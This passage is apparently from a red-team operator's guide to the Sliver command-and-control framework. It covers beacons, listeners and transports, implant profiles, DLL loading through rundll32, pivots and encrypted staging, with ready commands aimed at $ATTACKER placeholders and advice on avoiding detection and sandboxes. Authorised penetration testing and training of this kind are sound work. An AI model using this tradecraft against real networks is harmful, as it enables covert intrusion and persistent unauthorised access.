- Tasks are ordered and durable. You can queue ten commands while the beacon is asleep and they all run on the next check-in, in order. This is the correct way to use a beacon, and it is covered under situational awareness below.
- Task output arrives asynchronously. The console tells you a task was queued and then, potentially minutes later, prints the result. You can queue against other implants in the meantime.
- A task whose execution takes longer than one interval simply returns on a later check-in. It is not lost.
- A task queued against a beacon that never comes back is queued forever.

```bash
# list implants by mode
sessions
beacons

# select one and enter its context
use $IMPLANT_ID

# inspect the task queue for the current beacon
tasks
tasks fetch $TASK_ID

# change the check-in behaviour of a live implant
reconfig --beacon-interval 900s --beacon-jitter 300s     # short forms -i and -j; values go through Go's time.ParseDuration
```

**Interval and jitter.** The interval is the base sleep. The jitter is the random amount added to or subtracted from it on each cycle. A 60 second interval with zero jitter produces a check-in at exactly 60 second spacing, which is a signature so obvious that free tooling detects it. Jitter should be a substantial fraction of the interval, not a token five seconds. The original notes generate a beacon with `--seconds 5 --jitter 1`, a five second interval with one second of jitter: that is effectively a session with extra steps, it will hammer your listener, and the timing regularity is trivially detectable. Treat that as a lab-only configuration.

A useful default for real work is a long interval with jitter around 30 to 50 percent of it, tightened temporarily only when you need interactive throughput. Because you can `reconfig` a live implant, the correct pattern is: deploy long and slow, tighten for a burst of work, loosen again before you walk away.

**When to switch a beacon into a session.** Some things genuinely need real time. Interactive shell work, a SOCKS proxy carrying tool traffic, a long file transfer, driving a database client through a port forward. Sliver lets you task a beacon to open a session on the same transport:

```bash
# from within a beacon's context, task it to open an interactive session
interactive

# from within a session, drop back to leaving the beacon to it
background
```

The risks are real and worth stating plainly. The new session is a persistent connection from the same host, so you have just created the network artefact you chose the beacon to avoid, and you have created it from a host you already care about. If a network detection fires on that session, the investigation lands on the machine your beacon lives on. Anything that crashes the session process may take the implant with it. And a session that dies while you are mid-operation leaves you waiting for the next beacon check-in with no idea whether the failure was your command or the host.

The discipline: open a session for a bounded task with a plan, close it, and go back to beaconing. Never leave a session up because it is convenient.

| | Session | Beacon |
| --- | --- | --- |
| Connection | Persistent | Periodic, connect and drop |
| Command latency | Immediate | One check-in interval, on average half the interval plus jitter |
| Network profile | Long-lived flow to one destination, easy to spot | Periodic short flows, blends with normal service traffic |
| Tasking | Synchronous, type and wait | Queued server-side, results return later |
| Survives brief network loss | Poorly, reconnect logic dependent | Naturally, it was not connected anyway |
| Interactive shell, SOCKS, large transfers | Yes | Not practically |
| Correct default for real operations | No | Yes |
| Correct for a lab or a bounded interactive burst | Yes | Switch into one temporarily |

### Server and client setup

**Installation.** The one-line installer fetches the release binaries, installs a systemd unit, and unpacks the assets the server needs to cross-compile implants:

```bash
curl https://sliver.sh/install | sudo bash
```

Read that script before you run it, not for safety theatre but because it tells you exactly where things land, which you will need later. The manual route is to download `sliver-server_linux` and `sliver-client_linux` from the GitHub releases, mark them executable, and run `sliver-server unpack --force` once to lay down the embedded Go toolchain and assets. Manual installation is preferable on a teamserver you intend to keep, because you control the paths and you are not depending on an installer script fetching over TLS from a domain you do not own.

**Running the server.** Two modes. Running `sliver-server` directly gives you an interactive console on the server host, which is fine for a lab and wrong for anything shared. For real use, run it as a daemon and connect with `sliver-client`:

```bash
sudo systemctl enable --now sliver
sudo systemctl status sliver
journalctl -u sliver -f
```

The daemon binds the multiplayer gRPC listener, by default on port 31337, and reads its configuration from the server config file under the server state directory. The unit runs as root in the default installation, which is how the HTTPS listener gets port 443 and the DNS listener gets port 53. If you would rather not run it as root, grant the binary `CAP_NET_BIND_SERVICE` and use unprivileged ports behind a redirector.

**Where state lives.** Knowing this is the difference between recovering from a lost teamserver and abandoning every implant you have deployed.

| Path | Contents |
| --- | --- |
| `~/.sliver/` | Entire server state. Back this up. |
| `~/.sliver/configs/` | Server config, database config, HTTP C2 profile |
| `~/.sliver/certs/` | Certificate authorities and issued certificates for mTLS, HTTPS and operators |
| `~/.sliver/logs/` | Server log and the operator audit log |
| `~/.sliver/slivers/` | Built implant artefacts |
| `~/.sliver/sliver.db` | Default SQLite database holding implants, profiles, beacons, tasks and loot. Dialect and connection details come from `configs/database.yaml`, so this becomes a Postgres or MySQL connection if you configure one |
| `~/.sliver-client/configs/` | Operator connection profiles on the client machine |
| `~/.sliver-client/aliases/` | Armory-installed aliases |
| `~/.sliver-client/extensions/` | Armory-installed and hand-built extensions |

The database backend is configurable, SQLite by default, with MySQL and Postgres supported through the database config file. On a long engagement with several operators, moving off SQLite avoids lock contention.

**The thing people get wrong.** The certificate authorities in `~/.sliver/certs/` are what your deployed implants trust. Lose that directory and every implant already in the target environment is permanently unreachable: it will keep calling out forever to a server whose identity it cannot verify, and you cannot rebuild a server it will talk to. Snapshot `~/.sliver/` before and after any significant change, and keep the snapshot somewhere that is not the teamserver.

**Multiplayer and operator certificates.** Sliver's multi-operator model is mutual TLS with per-operator client certificates, not usernames and passwords. From the server console:

```bash
# enable the operator listener
multiplayer

# mint a config for an operator, bound to the address they will connect to
new-operator --name alice --lhost teamserver.example.com --lport 31337 --save /tmp/alice.cfg

# list and revoke
operators
kick-operator --name alice
```

The generated `.cfg` is JSON containing the operator's private key, their certificate, and the server's CA certificate. It is a full credential: whoever holds it is that operator. Hand it over out of band, and delete the copy on the teamserver once it is delivered. On the operator's machine:

```bash
sliver-client import /path/to/alice.cfg
sliver-client
```

Revocation via `kick-operator` is genuine, it removes the certificate from the server's trust store, so a leaked config stops working. That is the reason to give every operator their own config rather than sharing one.

Multiplayer also means every operator sees every session, beacon and job. That is desirable for coordination and it means your mistakes are visible, which is also desirable. The audit log records who tasked what.

### Transports and listeners

A listener in Sliver is a **job**. Jobs are started with the transport's command and managed with `jobs`:

```bash
jobs
jobs -k $JOB_ID
```

| Transport | Command | Typical port | Throughput | Fits through | Main weakness |
| --- | --- | --- | --- | --- | --- |
| Mutual TLS | `mtls` | 8888 by default | High | Direct egress on an arbitrary port | Dies against any TLS-inspecting proxy; non-standard port stands out |
| HTTPS | `https` | 443 | High | Web proxies, most egress filters | Certificate and JA3/JARM fingerprint; default URL patterns are signatured |
| HTTP | `http` | 80 | High | Almost anything | Cleartext C2 metadata; trivially inspectable |
| DNS | `dns` | 53 | Dreadful | Networks with no other egress at all | Enormous query volume, very slow, very loud to anyone looking |
| WireGuard | `wg` | Configurable | High | UDP egress | Needs UDP out; unusual protocol on a corporate network |
| TCP pivot | `pivots tcp` | Operator chosen | High | Nothing, it is internal only | Requires an already-controlled host with egress |
| Named pipe pivot | `pivots named-pipe` | SMB, 445 | Moderate | Nothing, internal only | Pipe names are a well-known detection target |

#### Mutual TLS

**What it is.** Both ends present certificates and both verify. The implant will not talk to a server that cannot prove it holds a key signed by the CA baked into that implant, and the server will not talk to an implant that cannot do the same.

**Why it works, and the certificate model.** On first run the server generates several distinct certificate authorities: one for implants, one for operators, one for the server side of listeners. Every implant you build gets its own client certificate and private key, embedded in the binary, signed by the implant CA. Every listener presents a server certificate signed by the server CA. Both CA certificates are embedded in the implant.

The consequences are worth spelling out because they drive when mTLS is the right choice:

- There is no CA in the public trust chain involved. Nothing about this certificate looks legitimate to a proxy, and it does not need to.
- Because the implant pins its CA, a TLS-terminating middlebox cannot sit in the middle. The handshake fails outright. On any network that forces inspection of outbound TLS, mTLS does not work, full stop, and the failure looks like a network problem rather than a detection.
- Because the server verifies client certificates, nobody can talk to your listener without a certificate you issued. A scanner that finds the port gets a handshake failure. This is genuinely useful: it keeps casual internet noise and blue-team probing out of your logs.
- The private key is inside the implant binary. Anyone who recovers the binary recovers a valid client certificate and can talk to your listener as that implant. They cannot impersonate your *server* without the server key, so they cannot take over other implants, but they can enumerate that one implant's tasking and burn it.

```bash
mtls --lhost 0.0.0.0 --lport 443
```

**When to use it.** Direct egress, no inspection, and you want the strongest link security with the least configuration. It is the right first choice in a lab and a reasonable choice on a flat network. It is the wrong choice anywhere traffic must go through a proxy.

#### HTTP and HTTPS

**What it is.** The implant speaks HTTP, wrapping the C2 protocol in requests and responses that look like ordinary web traffic. HTTPS is the same thing inside TLS.

**Why it works.** Almost every network permits outbound web traffic, usually through a proxy, and the proxy will happily forward requests it can parse. This is the transport that actually gets out of real networks. Sliver's HTTP C2 is not a thin wrapper: it has a configurable set of URL path segments, filenames, file extensions, cookie and parameter names, and user agent. **Where that configuration lives changed.** In 1.5 it was a file, `~/.sliver/configs/http-c2.json`, which you edited and restarted around. From 1.6 onward the profiles live in the server database and are managed from the console with the `c2profiles` command, which lists them, and `c2profiles import --file <path> --name <name>` and `c2profiles export --file <path> --name <name>` to move them in and out as JSON. So a note telling you to edit *http-c2.json* is describing 1.5, and on a current server the file either does not exist or is ignored.

```bash
# HTTPS with your own certificate and key
https --lhost 0.0.0.0 --lport 443 --cert /opt/certs/fullchain.pem --key /opt/certs/privkey.pem

# HTTPS with automatic Let's Encrypt issuance, needs a real domain pointing here and port 80 reachable
https --domain c2.example.com --lets-encrypt

# HTTP, with a website serving cover content for anything that is not C2
http --lhost 0.0.0.0 --lport 80 --website FakePortfolioSite
```

**The part that gets people caught.** The default HTTP C2 profile is public. Its URL structure, its extension list, its cookie names and the way it pads responses are all in the source tree, and there are public network signatures for exactly that. If you deploy an HTTPS listener with default settings you are relying entirely on the traffic being encrypted, and you lose the moment inspection is in play or the moment someone runs a rule set that keys on the path patterns. Editing the HTTP C2 profile so that paths, extensions and cookie names match the target's normal traffic is one of the highest-value hours you can spend.

For HTTPS specifically: use a real certificate for a real domain with plausible history, either through Let's Encrypt or a purchased certificate on a domain you aged. A self-signed certificate on port 443 is an alert in most environments.

#### DNS

**What it is.** C2 encoded into DNS queries and responses. The implant asks for names under a domain you control, encoding request data into subdomain labels, and reads response data out of the answer records.

**Why it works.** Almost every network resolves DNS, and it usually does so through an internal resolver that will recursively fetch anything, including names under your domain, from a host that has no other egress at all. Nothing needs to be allowlisted because DNS is already allowed.

**Preconditions.** You need a domain whose NS records delegate a subdomain to your teamserver's public IP, port 53/UDP reachable on that server, and patience. The delegation must actually work from the internet, test it with `dig` from an unrelated network before you build the implant.

```bash
# on the server: the trailing dot is required
dns --domains c2.example.com. --lport 53

# verify delegation independently before trusting it
dig +short TXT test.c2.example.com. @1.1.1.1
```

**Why the throughput is dreadful and what that means.** Every byte has to survive base32-style encoding into DNS labels, each label is capped at 63 characters and each name at 255, and the resolver in the middle may cache, truncate, reorder or refuse. Effective bandwidth is on the order of a few kilobytes per second under good conditions and much worse through a slow corporate resolver. A `download` of anything larger than a text file is not happening. Even task output of a few hundred kilobytes takes minutes and generates thousands of queries.

**When it is worth it.** Exactly one situation: the host has no other egress and you need a foothold. Get in over DNS, use it to establish a pivot or to move to a host that does have egress, and abandon it. Treating DNS as a working transport for post-exploitation is how you get caught, because the query volume is extraordinary and DNS analytics are common precisely because tunnelling over DNS is a known technique.

**Canaries.** Related and genuinely useful: Sliver can embed a unique DNS canary domain into an implant at build time. If that name is ever resolved, something detonated your implant somewhere you did not put it, which almost always means a sandbox or a reverse engineer. The `canaries` command lists them and their trigger state. Build canaries into anything you hand off or leave on disk.

#### Peer-to-peer: TCP and named pipe pivots

**What it is.** An implant on a host that can reach the internet acts as a relay for implants on hosts that cannot. The downstream implant's transport is not the internet, it is another implant.

**Why it works.** Nothing about the C2 protocol requires the transport to reach your server directly. The pivot implant runs a listener, accepts the downstream implant's connection, and multiplexes that traffic over its own existing transport. To the network, the isolated host is talking to a peer on the same segment, which is normal, and the internet-facing host's traffic volume goes up slightly.

**Preconditions.** You already own a host with egress and network reachability to the isolated host. For named pipes you need SMB reachability, which on a Windows network you usually have. The downstream implant must be *built* with the pivot as its transport, so you need to know the pivot's address or pipe name before you generate it.

```bash
# from within a session on the host that has egress
pivots tcp --bind 0.0.0.0:9898
pivots named-pipe --bind sliver-pipe

# list active pivot listeners and connected downstream implants
pivots

# build an implant that calls the pivot rather than the internet
generate beacon --tcp-pivot $PIVOT_HOST:9898 --os windows --arch amd64 --format shellcode --save /tmp/
generate beacon --named-pipe 'sliver-pipe' --os windows --arch amd64 --format shellcode --save /tmp/
```

**Tradeoffs.** TCP pivots are fast and simple but introduce a listening port on a workstation, which endpoint tooling and internal port scans both notice. Named pipe pivots produce no listening TCP port and ride SMB traffic that is already there, which is quieter on the network, but named pipe creation and connection are heavily instrumented on modern Windows and the pipe name is a string you chose, so pick one that is plausible rather than `sliver-pipe`. Both share a structural fragility: kill the pivot host and everything downstream of it goes dark at once. Do not build a deep chain of pivots through hosts you do not control the stability of.

#### Choosing a transport from the target's egress controls

Work down this list against what you actually observed, not what you assume:

| What you observed | Transport |
| --- | --- |
| Arbitrary outbound TCP permitted, no inspection | mTLS on 443, or HTTPS if you want the traffic to also *look* like web |
| Outbound web only, through a proxy, no TLS inspection | HTTPS, with a real certificate and a tuned C2 profile |
| Outbound web only, TLS inspected and re-signed | HTTPS with a certificate the inspection engine will accept, or accept cleartext HTTP with a heavily customised profile |
| Nothing outbound except DNS resolution | DNS, as a bridgehead only |
| Nothing outbound at all | Pivot over TCP or named pipe from a host that does have egress |
| UDP egress permitted, TCP filtered | WireGuard |

Test egress from the foothold before you build a second implant. A single request from the host you already own tells you more than any assumption about the perimeter.

### Profiles and implant generation

#### What a profile is and why you use one

A **profile** is a saved set of generation options under a name. `generate` takes a dozen flags; a profile takes those flags once and lets you build from the name afterwards. That matters for three reasons beyond typing less.

First, several other things in Sliver consume profiles rather than flags. Stage listeners serve the payload built from a profile. The service-based lateral movement command takes a profile name. You cannot use those features properly without profiles.

Second, reproducibility. Six days into an engagement you need another implant with exactly the transport, jitter and format of the one that is working. A profile guarantees that; a remembered command line does not.

Third, consistency of tradecraft. If your interval, jitter and reconnect settings live in a profile, every implant you deploy shares them, and when you decide to change them you change one thing.

```bash
# create a beacon profile
profiles new beacon --mtls $ATTACKER:443 --os windows --arch amd64 --format shellcode --seconds 900 --jitter 300 --evasion win-beacon-mtls

# create a session profile
profiles new --http $ATTACKER --os windows --arch amd64 --format service --skip-symbols svc-session-http

# list, inspect, build from, remove
profiles
profiles generate --save /var/www/html/ win-beacon-mtls
profiles rm win-beacon-mtls
```

#### Meaningful build options

`generate` and `profiles new` take the same option set. These are the ones that change the outcome rather than the filename.

| Option | Effect | Notes |
| --- | --- | --- |
| `--os` | Target OS: `windows`, `linux`, `darwin` | |
| `--arch` | `amd64`, `386`, `arm64` | `386` is still needed for old estates and for 32-bit host processes |
| `--format` / `-f` | `exe`, `shared`, `service`, `shellcode` | See the format table below |
| `--mtls` / `--http` / `--https` / `--dns` / `--wg` | Transport and callback address | Repeatable, multiple transports become an ordered fallback list |
| `--strategy` | Connection strategy across multiple C2 endpoints: sequential, random, random-domain | `rd` picks a random domain per attempt, which spreads your traffic across fronts |
| `--seconds` | Beacon check-in interval | Beacon mode only |
| `--jitter` | Random variation added to the interval | Beacon mode only. Make it a real fraction of the interval |
| `--reconnect` | How long to wait before retrying a failed connection | Short values produce a burst of failed connections, which is itself a signature |
| `--poll-timeout` | How long a poll may block before the implant gives up on it | Relevant to HTTP transports |
| `--max-errors` | Consecutive failures before the implant gives up entirely and exits | Set this deliberately. Too low and a network blip kills your access; too high and a dead listener produces failed connections forever |
| `--timeout` | Build and connection timeout | Large obfuscated builds genuinely take minutes; raise it rather than assume the build failed |
| `--evasion` | Enables in-implant evasion features at build time | Costs size and build time. See the note below |
| `--skip-symbols` | Skips symbol obfuscation | Much faster build, much more detectable binary |
| `--debug` | Builds with debug output to stdout | Invaluable when an implant will not call back, and absolutely not for a target |
| `--canary` | Embeds a DNS canary domain | Tells you when your implant is detonated in a sandbox |
| `--name` | Names the implant build | Do this. See operational hygiene |
| `--save` | Where to write the artefact | |

**Guardrails.** These are the most underused options in the framework and the original notes do not mention them at all. They compile a condition into the implant so that it refuses to run outside the environment you intend:

| Flag | Restricts execution to |
| --- | --- |
| `--limit-domainjoined` | Hosts joined to a domain |
| `--limit-hostname` | A specific hostname |
| `--limit-username` | A specific user |
| `--limit-datetime` | Before a given date and time |
| `--limit-fileexists` | Hosts where a given file exists |
| `--limit-locale` | A given system locale |

Use `--limit-datetime` on everything you deploy. It is a hard expiry: after that timestamp the implant will not run, which limits the damage of a binary you lose track of and gives you a defensible answer about scope. `--limit-domainjoined` and `--limit-hostname` neuter your implant in a sandbox, since analysis VMs are typically neither domain-joined nor named what you specified.

**On `--evasion`.** It is much narrower than the name suggests, and knowing what it actually does stops you expecting protection you are not getting. It is a Windows amd64 compile-time gate that inserts a call to Sliver's `RefreshPE` routine in exactly two code paths: before a process dump, and before process injection or sideloading. `RefreshPE` reloads *ntdll.dll* (and *kernel32.dll* on the injection path) from disk, makes the mapped *.text* section writable, and overwrites it with the on-disk bytes, which removes userland inline hooks. So it is a targeted unhooking step for the injection and dumping primitives, and it is a complete no-op if you never use them. It does nothing for the implant's network behaviour, nothing for its on-disk artefact, and nothing at all on Linux or macOS. Do not read it as an evasion mode.

#### Output formats and what each is for

| Format | Artefact | Use it when |
| --- | --- | --- |
| `exe` | Standalone executable, PE on Windows | You can write a file and run it. Simplest thing that works, and the loudest: a new unsigned binary on disk executing is the most-monitored event on the platform |
| `shared` | DLL on Windows, `.so` on Linux, `.dylib` on macOS | You have a DLL hijack, a `rundll32`-style execution primitive, or you want to load it into an existing process from another implant |
| `service` | Executable that implements the Windows service control protocol | Service-based execution, including remote service creation for lateral movement. A normal `exe` installed as a service will be killed by the service control manager for failing to respond to the start request |
| `shellcode` | Position-independent shellcode | Anything that injects: your own loader, a process injection primitive, a stage served over the network, an Office macro. This is the format you want for real delivery |

The `shellcode` format is produced by converting the compiled executable into position-independent code. That conversion is what makes the artefact large: Sliver shellcode is hundreds of kilobytes, not the few hundred bytes people expect from the word "shellcode". Plan around that, it is the reason staging exists.

#### The DLL export entry point

The original notes show `generate --mtls $ATTACKER:443 --format shared` with a bare comment reading "DLL Entrypoint (StartW)" and no explanation. Here is what that means.

A DLL is not directly runnable. Something has to load it and call into it. Sliver's `shared` build exports named functions so that a loader has something to call, and the conventional one is `StartW`, the blocking variant that runs the implant on the calling thread and does not return. The export list is set with `generate --exports` (short form `-v`) and the console default is `StartW,VoidFunc,DllInstall,DllRegisterServer,DllUnregisterServer`. All of them are the same function under different names, each calling into the implant's entry point once and guarded so that only the first call does anything. That matters because `DllRegisterServer` and `DllInstall` are what *regsvr32.exe* calls, so the default build is already loadable through the signed-binary proxy routes without you generating anything special. If you want a single unusual export name and nothing else, set `--exports` explicitly; the server falls back to just `StartW` when the field is empty.

That gives you these delivery routes:

```cmd
rem execution via the built-in DLL host, calling the export by name
rundll32.exe C:\Windows\Temp\update.dll,StartW
```

```bash
# from another implant: load the DLL into a sacrificial process
sideload --process c:\\windows\\system32\\notepad.exe /path/to/implant.dll

# from another implant: reflectively load into a process, calling a named export
spawndll --process c:\\windows\\system32\\notepad.exe --export StartW /path/to/implant.dll
```

The blocking behaviour has a practical consequence: whatever process called `StartW` is now your implant's host for its entire life. With `rundll32` that means a `rundll32.exe` process that never exits, which is abnormal and worth avoiding in favour of a DLL hijack where a long-running host process is expected anyway.

#### The symbol obfuscation question

By default Sliver obfuscates the Go symbol names in the implant before compiling. This matters because a stock Go binary is extremely self-describing: the symbol table contains full package paths, and a Go binary with `github.com/bishopfox/sliver` in its strings needs no further analysis. Symbol obfuscation renames those.

The cost is build time. An obfuscated build can take several minutes and consume significant CPU and memory on the teamserver, and the obfuscation step is the most common cause of a build that fails or hangs. `--skip-symbols` turns it off and drops the build to seconds.

The decision:

- Use `--skip-symbols` while you are iterating in a lab or debugging why an implant will not call back. Nothing you learn depends on the symbol names.
- Never use `--skip-symbols` for an artefact that touches a target. You are handing the defender a binary that identifies the framework from `strings`.
- Expect obfuscated builds to occasionally produce a broken artefact. If an implant compiles but does nothing, rebuild with `--skip-symbols --debug` to determine whether the problem is your configuration or the obfuscation.

Symbol obfuscation is not a defence against a competent analyst and it does nothing about the behavioural signature. It raises the cost of the first five minutes of analysis, which is worth having and is all it is worth.

### Staging

#### What a stager is and why you would accept the extra round trip

A **stager** is a small piece of code whose only job is to fetch the real implant over the network, load it into memory, and jump to it. The full implant, the **stage**, never touches disk.

You accept an extra network request for four reasons:

1. **Size.** Sliver shellcode is hundreds of kilobytes. Many delivery primitives cannot carry that: a macro, a LOLBin command line, an exploit payload buffer, a registry value, an environment variable. A stager is small enough to fit.
2. **Disk.** The stage lives only in memory. There is no file for on-disk scanning to find and no file for forensics to recover later.
3. **Late binding.** The stage is served at execution time, so you can change the implant without rebuilding and redelivering the thing that runs it. Fix a transport, adjust jitter, rebuild, and the next execution of the same stager picks up the new stage.
4. **Static analysis.** The stager is a few hundred bytes of network code. It contains almost nothing to signature compared to a full implant.

The costs, equally plainly: the stage fetch is a distinctive network event, the whole thing fails if the stage host is unreachable at the moment of execution, and if the stage is unencrypted anyone who captures that traffic gets your entire implant.

#### Stage listeners

A stage listener is a job that serves the payload built from a profile:

```bash
# build the profile whose output will be served as the stage
profiles new beacon --mtls $ATTACKER:443 --format shellcode --os windows --arch amd64 win-shellcode

# serve it over raw TCP
stage-listener --url tcp://$ATTACKER:8080 --profile win-shellcode

# serve it over HTTP
stage-listener --url http://$ATTACKER:8080 --profile win-shellcode
```

The URL scheme matters more than it looks. `stage-listener` itself only implements **TCP** in the current client: hand it an `http://` or `https://` URL and it returns "Unsupported staging protocol", despite the official documentation still showing an HTTP example. That documentation example is wrong against current code, which is worth knowing before you spend an afternoon on it. The working route for HTTP staging is different: start an ordinary `http` or `https` C2 listener, mark a build or profile as staged (`implants stage` / `profiles stage`), and the C2 listener's own stager handler serves the payload. On that path the request path is **not** fully arbitrary. The filename stem is cosmetic, which is why the original notes' `/hello.woff` and `/anything.woff` both work, but the **extension must match the stager file extension configured in the HTTP C2 profile**, which defaults to `.woff`. Change the profile's extension to fit the environment and then match it in the URL; do not just pick an extension you like and expect a 200.

Note that the stage listener and the implant's C2 listener are separate jobs on separate ports serving separate purposes. The stage listener exists only to hand out the payload; once the stage is running it talks to the C2 listener defined in the profile. Confusing the two is the single most common staging mistake, and it produces a stager that runs, fetches successfully, and then never calls back because there is nothing listening on the C2 port.

#### Size and encoding constraints

Two constraints bite in practice.

**The stager's own size.** Whatever carries your stager has a limit. A command line has a practical ceiling in the low thousands of characters. An Office macro has its own limits and its own encoding overhead. Base64 inflates by a third; hex doubles. Work backwards from the carrier's limit, subtract encoding overhead, and that is your stager budget.

**Bad characters.** If the stager travels through something that mangles bytes, a null byte terminates a C string, a newline breaks a single-line context, non-ASCII breaks a text field, then the shellcode must avoid those bytes. `generate stager` accepts a bad-character list and an output format for exactly this reason.

```bash
# formats follow the msfvenom set: c, csharp, hex, ps1, py, raw, vbapplication and others
generate stager --lhost $ATTACKER --lport 8080 --format csharp
generate stager --lhost $ATTACKER --lport 8080 --format ps1
generate stager --lhost $ATTACKER --lport 8080 --format raw --save /tmp/stager.bin
```

In Sliver 1.5 the `generate stager` command built the stager using Metasploit's payload generation, so Metasploit had to be installed on the teamserver or the command failed with an error that did not obviously say so. **The command has since been removed entirely.** Sliver's own documentation now says so plainly and directs you to generate stagers with `msfvenom` yourself, noting that the Metasploit stager route is only supported on Windows. So the dependency did not go away, it moved off the teamserver and onto your workstation, which is arguably the better arrangement. The other option remains writing your own downloader, which is a fifty-line job and gives you full control over the network behaviour.

#### Unencrypted versus encrypted stages

The unencrypted flow is the one the original notes show first, and it is the one you should not use:

```bash
profiles new beacon --mtls $ATTACKER:443 --format shellcode --os windows --arch amd64 shellcode-beacon
stage-listener --url tcp://$ATTACKER:8080 --profile shellcode-beacon
generate stager --lhost $ATTACKER --lport 8080 --format c
```

**Why an unencrypted stage is a poor idea.** The bytes crossing the network are your implant, in the clear. Any network sensor with content inspection sees a large blob of executable code being fetched from an external host by a workstation, which is a high-fidelity detection on its own regardless of signatures. Any PCAP captured during the engagement, or afterwards during an investigation, yields your complete implant for analysis, including the embedded certificates and the C2 addresses. A perimeter product that extracts and scans files from HTTP responses gets a free shot at your implant before it ever runs. And on a plain TCP stage listener, anyone who connects to the port gets your implant, which means an internal port scan collects it for you.

The encrypted variant fixes the network exposure by AES-encrypting the stage, with the stager holding the key:

```bash
# key must be exactly 32 bytes, IV exactly 16 bytes
stage-listener \
  --url https://$ATTACKER:8080 \
  --profile win-shellcode \
  --cert /opt/certs/front.crt \
  --key /opt/certs/front.key \
  --compress deflate9 \
```
